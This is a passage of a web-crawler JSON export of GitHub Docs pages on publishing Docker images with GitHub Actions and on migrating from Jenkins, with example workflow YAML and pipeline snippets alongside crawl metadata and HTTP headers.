how it was built. It increases supply chain security for people who consume the image. For more information, see [Using artifact attestations to establish provenance for builds](/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME}}\n          subject-digest: ${{ steps.push.outputs.digest }}\n          push-to-registry: true\n      \n```\n\nThe above workflow is triggered by a push to the \"release\" branch. It checks out the GitHub repository, and uses the `login-action` to log in to the Container registry. It then extracts labels and tags for the Docker image. Finally, it uses the `build-push-action` action to build the image and publish it on the Container registry.\n\n## [Publishing images to Docker Hub and GitHub Packages](#publishing-images-to-docker-hub-and-github-packages)\n\nIn a single workflow, you can publish your Docker image to multiple registries by using the `login-action` and `build-push-action` actions for each registry.\n\nThe following example workflow uses the steps from the previous sections ([Publishing images to Docker Hub](#publishing-images-to-docker-hub) and [Publishing images to GitHub Packages](#publishing-images-to-github-packages)) to create a single workflow that pushes to both registries.\n\nYAML\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Publish Docker image\n\non:\n  release:\n    types: [published]\n\njobs:\n  push_to_registries:\n    name: Push Docker image to multiple registries\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n      attestations: write\n      id-token: write\n    steps:\n      - name: Check out the repo\n        uses: actions/checkout@v4\n\n      - name: Log in to Docker Hub\n        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          username: ${{ secrets.DOCKER_USERNAME }}\n          password: ${{ secrets.DOCKER_PASSWORD }}\n\n      - name: Log in to the Container registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: ghcr.io\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: |\n            my-docker-hub-namespace/my-docker-hub-repository\n            ghcr.io/${{ github.repository }}\n\n      - name: Build and push Docker images\n        id: push\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: ghcr.io/${{ github.repository }}\n          subject-digest: ${{ steps.push.outputs.digest }}\n          push-to-registry: true\n```\n\nThe above workflow checks out the GitHub repository, uses the `login-action` twice to log in to both registries and generates tags and labels with the `metadata-action` action. Then the `build-push-action` action builds and pushes the Docker image to Docker Hub and the Container registry.\n\nIn the last step, it generates an artifact attestation for the image, which increases supply chain security. For more information, see [Using artifact attestations to establish provenance for builds](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 257,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-publishing-packages-publishing-docker-images-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-publishing-packages-publishing-docker-images-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-publishing-packages-publishing-docker-images-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-publishing-packages-publishing-docker-images-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-publishing-packages-publishing-docker-images-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 28719,
      "readableText": 28149,
      "none": 68048,
      "readableTextIfPossible": 28149,
      "result": 28149,
      "markdown": 19092
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/using-github-hosted-runners",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/using-github-hosted-runners",
    "loadedTime": "2025-05-08T06:40:43.212Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/using-github-hosted-runners",
    "title": "Using GitHub-hosted runners - GitHub Docs",
    "description": "You can use GitHub's runners to execute your GitHub Actions workflows.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using GitHub-hosted runners - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "180C:210E8D:1ACC5:2224F:681C51E1",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:33 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686434.630368, VS0, VE262",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "23252",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using GitHub-hosted runners - GitHub Docs\nYou can use GitHub's runners to execute your GitHub Actions workflows.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-wbhx8.html",
  "markdown": "# Using GitHub-hosted runners - GitHub Docs\n\nYou can use GitHub's runners to execute your GitHub Actions workflows.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 236,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-removedElementsHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 0,
      "readableText": 316,
      "none": 25376,
      "readableTextIfPossible": 25376,
      "result": 316,
      "markdown": 115
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions",
    "loadedTime": "2025-05-08T06:40:51.430Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions",
    "title": "Migrating from Jenkins to GitHub Actions - GitHub Docs",
    "description": "GitHub Actions and Jenkins share multiple similarities, which makes migration to GitHub Actions relatively straightforward.",
    "author": null,
    "keywords": "Jenkins,Migration,CI,CD",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Migrating from Jenkins to GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "B81C:1E744F:F0469C:1396716:681C51EB",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:44 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686444.925202, VS0, VE383",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29054",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Migrating from Jenkins to GitHub Actions\nGitHub Actions and Jenkins share multiple similarities, which makes migration to GitHub Actions relatively straightforward.\nIntroduction\nJenkins and GitHub Actions both allow you to create workflows that automatically build, test, publish, release, and deploy code. Jenkins and GitHub Actions share some similarities in workflow configuration:\nJenkins creates workflows using Declarative Pipelines, which are similar to GitHub Actions workflow files.\nJenkins uses stages to run a collection of steps, while GitHub Actions uses jobs to group one or more steps or individual commands.\nJenkins and GitHub Actions support container-based builds. For more information, see Creating a Docker container action.\nSteps or tasks can be reused and shared with the community.\nFor more information, see Understanding GitHub Actions.\nKey differences\nJenkins has two types of syntax for creating pipelines: Declarative Pipeline and Scripted Pipeline. GitHub Actions uses YAML to create workflows and configuration files. For more information, see Workflow syntax for GitHub Actions.\nJenkins deployments are typically self-hosted, with users maintaining the servers in their own data centers. GitHub Actions offers a hybrid cloud approach by hosting its own runners that you can use to run jobs, while also supporting self-hosted runners. For more information, see About self-hosted runners.\nComparing capabilities\nDistributing your builds\nJenkins lets you send builds to a single build agent, or you can distribute them across multiple agents. You can also classify these agents according to various attributes, such as operating system types.\nSimilarly, GitHub Actions can send jobs to GitHub-hosted or self-hosted runners, and you can use labels to classify runners according to various attributes. For more information, see Understanding GitHub Actions and About self-hosted runners.\nUsing sections to organize pipelines\nJenkins splits its Declarative Pipelines into multiple sections. Similarly, GitHub Actions organizes its workflows into separate sections. The table below compares Jenkins sections with the GitHub Actions workflow.\nJenkins DirectivesGitHub Actions\nagent\tjobs.<job_id>.runs-on \njobs.<job_id>.container\t\npost\tNone\t\nstages\tjobs\t\nsteps\tjobs.<job_id>.steps\t\nUsing directives\nJenkins uses directives to manage Declarative Pipelines. These directives define the characteristics of your workflow and how it will execute. The table below demonstrates how these directives map to concepts within GitHub Actions.\nJenkins DirectivesGitHub Actions\nenvironment\tjobs.<job_id>.env \njobs.<job_id>.steps[*].env\t\noptions\tjobs.<job_id>.strategy \njobs.<job_id>.strategy.fail-fast \njobs.<job_id>.timeout-minutes\t\nparameters\tinputs \noutputs\t\ntriggers\ton \non.<event_name>.types \non.<push>.<branches|tags> \non.<pull_request>.<branches> \non.<push|pull_request>.paths\t\ntriggers { upstreamprojects() }\tjobs.<job_id>.needs\t\nJenkins cron syntax\ton.schedule\t\nstage\tjobs.<job_id> \njobs.<job_id>.name\t\ntools\tSpecifications for GitHub-hosted runners\t\ninput\tinputs\t\nwhen\tjobs.<job_id>.if\t\nUsing sequential stages\nParallel job processing\nJenkins can run the stages and steps in parallel, while GitHub Actions currently only runs jobs in parallel.\nJenkins ParallelGitHub Actions\nparallel\tjobs.<job_id>.strategy.max-parallel\t\nMatrix\nBoth GitHub Actions and Jenkins let you use a matrix to define various system combinations.\nJenkinsGitHub Actions\naxis\tstrategy/matrix \ncontext\t\nstages\tsteps-context\t\nexcludes\tNone\t\nUsing steps to execute tasks\nJenkins groups steps together in stages. Each of these steps can be a script, function, or command, among others. Similarly, GitHub Actions uses jobs to execute specific groups of steps.\nJenkinsGitHub Actions\nsteps\tjobs.<job_id>.steps\t\nExamples of common tasks\nScheduling a pipeline to run with cron\nJenkins pipeline with cron\npipeline { agent any triggers { cron('H/15 * * * 1-5') } } \nGitHub Actions workflow with cron\non: schedule: - cron: '*/15 * * * 1-5' \nConfiguring environment variables in a pipeline\nJenkins pipeline with an environment variable\npipeline { agent any environment { MAVEN_PATH = '/usr/local/maven' } } \nGitHub Actions workflow with an environment variable\njobs: maven-build: env: MAVEN_PATH: '/usr/local/maven' \nBuilding from upstream projects\nJenkins pipeline that builds from an upstream project\npipeline { triggers { upstream( upstreamProjects: 'job1,job2', threshold: hudson.model.Result.SUCCESS ) } } \nGitHub Actions workflow that builds from an upstream project\njobs: job1: job2: needs: job1 job3: needs: [job1, job2] \nBuilding with multiple operating systems\nJenkins pipeline that builds with multiple operating systems\npipeline { agent none stages { stage('Run Tests') { matrix { axes { axis { name: 'PLATFORM' values: 'macos', 'linux' } } agent { label \"${PLATFORM}\" } stages { stage('test') { tools { nodejs \"node-20\" } steps { dir(\"scripts/myapp\") { sh(script: \"npm install -g bats\") sh(script: \"bats tests\") } } } } } } } } \nGitHub Actions workflow that builds with multiple operating systems\nname: demo-workflow on: push: jobs: test: runs-on: ${{ matrix.os }} strategy: fail-fast: false matrix: os: [macos-latest, ubuntu-latest] steps: - uses: actions/checkout@v4 - uses: actions/setup-node@v4 with: node-version: 20 - run: npm install -g bats - run: bats tests working-directory: ./scripts/myapp",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-migrating-from-jenkins-to-github-actions-5juef.html",
  "markdown": "# Migrating from Jenkins to GitHub Actions\n\nGitHub Actions and Jenkins share multiple similarities, which makes migration to GitHub Actions relatively straightforward.\n\n## [Introduction](#introduction)\n\nJenkins and GitHub Actions both allow you to create workflows that automatically build, test, publish, release, and deploy code. Jenkins and GitHub Actions share some similarities in workflow configuration:\n\n*   Jenkins creates workflows using _Declarative Pipelines_, which are similar to GitHub Actions workflow files.\n*   Jenkins uses _stages_ to run a collection of steps, while GitHub Actions uses jobs to group one or more steps or individual commands.\n*   Jenkins and GitHub Actions support container-based builds. For more information, see [Creating a Docker container action](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action).\n*   Steps or tasks can be reused and shared with the community.\n\nFor more information, see [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions).\n\n## [Key differences](#key-differences)\n\n*   Jenkins has two types of syntax for creating pipelines: Declarative Pipeline and Scripted Pipeline. GitHub Actions uses YAML to create workflows and configuration files. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions).\n*   Jenkins deployments are typically self-hosted, with users maintaining the servers in their own data centers. GitHub Actions offers a hybrid cloud approach by hosting its own runners that you can use to run jobs, while also supporting self-hosted runners. For more information, see [About self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners).\n\n## [Comparing capabilities](#comparing-capabilities)\n\n### [Distributing your builds](#distributing-your-builds)\n\nJenkins lets you send builds to a single build agent, or you can distribute them across multiple agents. You can also classify these agents according to various attributes, such as operating system types.\n\nSimilarly, GitHub Actions can send jobs to GitHub-hosted or self-hosted runners, and you can use labels to classify runners according to various attributes. For more information, see [Understanding GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/understanding-github-actions#runners) and [About self-hosted runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners).\n\n### [Using sections to organize pipelines](#using-sections-to-organize-pipelines)\n\nJenkins splits its Declarative Pipelines into multiple sections. Similarly, GitHub Actions organizes its workflows into separate sections. The table below compares Jenkins sections with the GitHub Actions workflow.\n\n| Jenkins Directives | GitHub Actions |\n| --- | --- |\n| [`agent`](https://jenkins.io/doc/book/pipeline/syntax/#agent) | [`jobs.<job_id>.runs-on`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idruns-on)  <br>[`jobs.<job_id>.container`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idcontainer) |\n| [`post`](https://jenkins.io/doc/book/pipeline/syntax/#post) | None |\n| [`stages`](https://jenkins.io/doc/book/pipeline/syntax/#stages) | [`jobs`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobs) |\n| [`steps`](https://jenkins.io/doc/book/pipeline/syntax/#steps) | [`jobs.<job_id>.steps`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idsteps) |\n\n## [Using directives](#using-directives)\n\nJenkins uses directives to manage _Declarative Pipelines_. These directives define the characteristics of your workflow and how it will execute. The table below demonstrates how these directives map to concepts within GitHub Actions.\n\n| Jenkins Directives | GitHub Actions |\n| --- | --- |\n| [`environment`](https://jenkins.io/doc/book/pipeline/syntax/#environment) | [`jobs.<job_id>.env`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#env)  <br>[`jobs.<job_id>.steps[*].env`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsenv) |\n| [`options`](https://jenkins.io/doc/book/pipeline/syntax/#parameters) | [`jobs.<job_id>.strategy`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstrategy)  <br>[`jobs.<job_id>.strategy.fail-fast`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstrategyfail-fast)  <br>[`jobs.<job_id>.timeout-minutes`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idtimeout-minutes) |\n| [`parameters`](https://jenkins.io/doc/book/pipeline/syntax/#parameters) | [`inputs`](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs)  <br>[`outputs`](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#outputs-for-docker-container-and-javascript-actions) |\n| [`triggers`](https://jenkins.io/doc/book/pipeline/syntax/#triggers) | [`on`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#on)  <br>[`on.<event_name>.types`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes)  <br>[`on.<push>.<branches\\|tags>`](https://docs.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onpushbranchestagsbranches-ignoretags-ignore)  <br>[`on.<pull_request>.<branches>`](https://docs.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onpull_requestpull_request_targetbranchesbranches-ignore)  <br>[`on.<push\\|pull_request>.paths`](https://docs.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore) |\n| [`triggers { upstreamprojects() }`](https://jenkins.io/doc/book/pipeline/syntax/#triggers) | [`jobs.<job_id>.needs`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idneeds) |\n| [Jenkins cron syntax](https://jenkins.io/doc/book/pipeline/syntax/#cron-syntax) | [`on.schedule`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onschedule) |\n| [`stage`](https://jenkins.io/doc/book/pipeline/syntax/#stage) | [`jobs.<job_id>`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_id)  <br>[`jobs.<job_id>.name`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idname) |\n| [`tools`](https://jenkins.io/doc/book/pipeline/syntax/#tools) | [Specifications for GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#supported-software) |\n| [`input`](https://jenkins.io/doc/book/pipeline/syntax/#input) | [`inputs`](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs) |\n| [`when`](https://jenkins.io/doc/book/pipeline/syntax/#when) | [`jobs.<job_id>.if`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idif) |\n\n## [Using sequential stages](#using-sequential-stages)\n\n### [Parallel job processing](#parallel-job-processing)\n\nJenkins can run the `stages` and `steps` in parallel, while GitHub Actions currently only runs jobs in parallel.\n\n| Jenkins Parallel | GitHub Actions |\n| --- | --- |\n| [`parallel`](https://jenkins.io/doc/book/pipeline/syntax/#parallel) | [`jobs.<job_id>.strategy.max-parallel`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstrategymax-parallel) |\n\n### [Matrix](#matrix)\n\nBoth GitHub Actions and Jenkins let you use a matrix to define various system combinations.\n\n| Jenkins | GitHub Actions |\n| --- | --- |\n| [`axis`](https://jenkins.io/doc/book/pipeline/syntax/#matrix-axes) | [`strategy/matrix`](https://docs.github.com/en/actions/using-workflows/about-workflows#using-a-build-matrix)  <br>[`context`](https://docs.github.com/en/actions/learn-github-actions/contexts) |\n| [`stages`](https://jenkins.io/doc/book/pipeline/syntax/#matrix-stages) | [`steps-context`](https://docs.github.com/en/actions/learn-github-actions/contexts#steps-context) |\n| [`excludes`](https://jenkins.io/doc/book/pipeline/syntax/#matrix-stages) | None |\n\n### [Using steps to execute tasks](#using-steps-to-execute-tasks)\n\nJenkins groups `steps` together in `stages`. Each of these steps can be a script, function, or command, among others. Similarly, GitHub Actions uses `jobs` to execute specific groups of `steps`.\n\n| Jenkins | GitHub Actions |\n| --- | --- |\n| [`steps`](https://jenkins.io/doc/book/pipeline/syntax/#steps) | [`jobs.<job_id>.steps`](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idsteps) |\n\n## [Examples of common tasks](#examples-of-common-tasks)\n\n### [Scheduling a pipeline to run with `cron`](#scheduling-a-pipeline-to-run-with-cron)\n\n#### [Jenkins pipeline with `cron`](#jenkins-pipeline-with-cron)\n\n```\npipeline {\n  agent any\n  triggers {\n    cron('H/15 * * * 1-5')\n  }\n}\n```\n\n#### [GitHub Actions workflow with `cron`](#github-actions-workflow-with-cron)\n\n```\non:\n  schedule:\n    - cron: '*/15 * * * 1-5'\n```\n\n### [Configuring environment variables in a pipeline](#configuring-environment-variables-in-a-pipeline)\n\n#### [Jenkins pipeline with an environment variable](#jenkins-pipeline-with-an-environment-variable)\n\n```\npipeline {\n  agent any\n  environment {\n    MAVEN_PATH = '/usr/local/maven'\n  }\n}\n```\n\n#### [GitHub Actions workflow with an environment variable](#github-actions-workflow-with-an-environment-variable)\n\n```\njobs:\n  maven-build:\n    env:\n      MAVEN_PATH: '/usr/local/maven'\n```\n\n### [Building from upstream projects](#building-from-upstream-projects)\n\n#### [Jenkins pipeline that builds from an upstream project](#jenkins-pipeline-that-builds-from-an-upstream-project)\n\n```\npipeline {\n  triggers {\n    upstream(\n      upstreamProjects: 'job1,job2',\n      threshold: hudson.model.Result.SUCCESS\n    )\n  }\n}\n```\n\n#### [GitHub Actions workflow that builds from an upstream project](#github-actions-workflow-that-builds-from-an-upstream-project)\n\n```\njobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    needs: [job1, job2]\n```\n\n### [Building with multiple operating systems](#building-with-multiple-operating-systems)\n\n#### [Jenkins pipeline that builds with multiple operating systems](#jenkins-pipeline-that-builds-with-multiple-operating-systems)\n\n```\npipeline {\n  agent none\n  stages {\n    stage('Run Tests') {\n      matrix {\n        axes {\n          axis {\n            name: 'PLATFORM'\n            values: 'macos', 'linux'\n          }\n        }\n        agent { label \"${PLATFORM}\" }\n        stages {\n          stage('test') {\n            tools { nodejs \"node-20\" }\n            steps {\n              dir(\"scripts/myapp\") {\n                sh(script: \"npm install -g bats\")\n                sh(script: \"bats tests\")\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n#### [GitHub Actions workflow that builds with multiple operating systems](#github-actions-workflow-that-builds-with-multiple-operating-systems)\n\n```\nname: demo-workflow\non:\n  push:\njobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      fail-fast: false\n      matrix:\n        os: [macos-latest, ubuntu-latest]\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm install -g bats\n      - run: bats tests\n        working-directory: ./scripts/myapp\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 309,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-migrating-from-jenkins-to-github-actions-originalH",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-migrating-from-jenkins-to-github-actions-removedEl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-migrating-from-jenkins-to-github-actions-extractus",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-migrating-from-jenkins-to-github-actions-readableT",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-manually-migrating-to-github-actions-migrating-from-jenkins-to-github-actions-readableT"
    },
    "lengths": {
      "extractus": 21372,
      "readableText": 17703,
      "none": 41623,
      "readableTextIfPossible": 41623,
      "result": 17703,
      "markdown": 12027
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings",
    "loadedTime": "2025-05-08T06:40:48.516Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
